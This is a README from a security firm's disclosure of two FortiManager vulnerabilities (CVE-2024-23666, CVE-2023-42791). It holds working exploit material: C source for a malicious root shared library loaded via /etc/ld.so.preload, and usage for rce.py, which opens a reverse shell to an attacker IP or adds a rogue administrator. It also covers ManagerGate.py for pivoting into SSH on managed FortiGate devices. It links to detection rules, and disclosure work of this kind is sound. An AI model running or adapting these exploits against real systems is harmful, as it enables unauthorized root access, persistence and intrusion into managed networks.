# Fortimanager insufficient authorization checks (CVE-2024-23666) and unrestricted file upload (CVE-2023-42791) exploitation scripts

Two exploitation scripts leveraging these vulnerabilities are provided:

 - `rce.py`: Provides a reverse shell or adds an arbitrary administrator from unprivileged access to the FortiManager.
 - `ManagerGate.py`: Allows connecting to remote managed FortiGate SSH services. SSH passwords are still needed but can be found in the FortiManager configuration backup.

For more details, please refer to the associated advisory available at https://www.synacktiv.com/advisories/advisories/fortimanager-multiple-vulnerabilities

## Usage

### rce.py
Compile a malicious library that will run `/rce.sh`: 
```
$ cat rce.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    if (getuid() != 0) return 0;
    unlink("/etc/ld.so.preload");
    if (fork() == 0) {
        setgid(0);
        setuid(0);
        system("/bin/bash /rce.sh");
    }
    return 0;
}

$ gcc -fPIC -shared -o rce.so rce.c -nostartfiles
```

Usage:
```
$ python3 rce.py -h
usage: rce.py [-h] [-k] [-l LIBRARY] connection {revshell,adduser} ...

positional arguments:
  connection            User, password, and host (user:password@host)

options:
  -h, --help            show this help message and exit
  -k, --insecure        Do not check the remote host certificate (default: False)
  -l LIBRARY, --library LIBRARY
                        Malicious library path (default: /tmp/rce.so)

Action to run:
  {revshell,adduser}
    revshell            Run a Python reverse shell
    adduser             Create a new administrator
```

To obtain a reverse shell:
```
$ python3 rce.py -k -l ./rce.so lowpriv:password@10.10.10.1 revshell 10.10.10.100 1234
[+] Login to the FortiManager
[+] Uploading /rce.sh
[+] Uploading /rce.so
[+] Uploading /etc/ld.so.preload
[+] Login out of the FortiManager to trigger the RCE
```

To add a new administrator to the FortiManager:
```
$ python3 rce.py -k -l ./rce.so lowpriv:password@10.10.10.1 adduser malicious_adm password
[+] Login to the FortiManager
[+] Uploading /create_user.txt
[+] Uploading /rce.sh
[+] Uploading /rce.so
[+] Uploading /etc/ld.so.preload
[+] Login out of the FortiManager to trigger the RCE
```


### ManagerGate.py

```
$ python3 ManagerGate.py -h
usage: ManagerGate.py [-h] -H HOST -u USER -p PASSWORD [-d DEVICEID] [-i TUNNELIP] [-l] [-x PROXY] -U GU [-v VERBOSE]

get a shell on fortigate

options:
  -h, --help            show this help message and exit
  -H HOST, --host HOST  host of the fortimanager
  -u USER, --user USER  user to connect with to the fortimanager
  -p PASSWORD, --password PASSWORD
                        password to connect to the fortimanager
  -d DEVICEID, --deviceid DEVICEID
                        device oid to get shell
  -i TUNNELIP, --tunnelip TUNNELIP
                        tunnel ip of the fortigate
  -l, --local           local connect to fortimanager
  -x PROXY, --proxy PROXY
                        proxy request
  -U GU, --gu GU        user to connect with to the fortigate
  -v VERBOSE, --verbose VERBOSE

```

Example
```
$ python3 ManagerGate.py -H 10.0.0.1 -u ReadOnlyUser -p MyPassword123 -d 1011 -i 169.254.0.2   -U root
```

Device OID and tunnel IP of the targeted FortiGates can be found on the FortiManager GUI.

## Affected versions

- CVE-2023-42791         
   - FortiManager ≤ 7.4.0 ≤ 7.2.3 ≤ 7.0.8 ≤ 6.4.12 ≤ 6.2.11         
- CVE-2024-23666         
   - FortiManager ≤ 7.4.2 ≤ 7.2.5 ≤ 7.0.12 ≤ 6.4.14
   - FortiAnalyzer ≤ 7.4.2 ≤ 7.2.5 ≤ 7.0.12 ≤ 6.4.14
   - FortiAnalyzer-BigData ≤ 7.4.0 ≤ 7.2.6 7.0.x 6.4.x 6.2.x

## Sigma Detection Rules
Sigma detection rules aimed at detecting use of these exploitation scripts are available in Synacktiv's rules repository: https://github.com/synacktiv/synacktiv-rules/tree/main/2025/fortimanager

## References
- https://www.synacktiv.com/advisories/advisories/fortimanager-multiple-vulnerabilities
- https://fortiguard.fortinet.com/psirt/FG-IR-23-189
- https://fortiguard.fortinet.com/psirt/FG-IR-23-396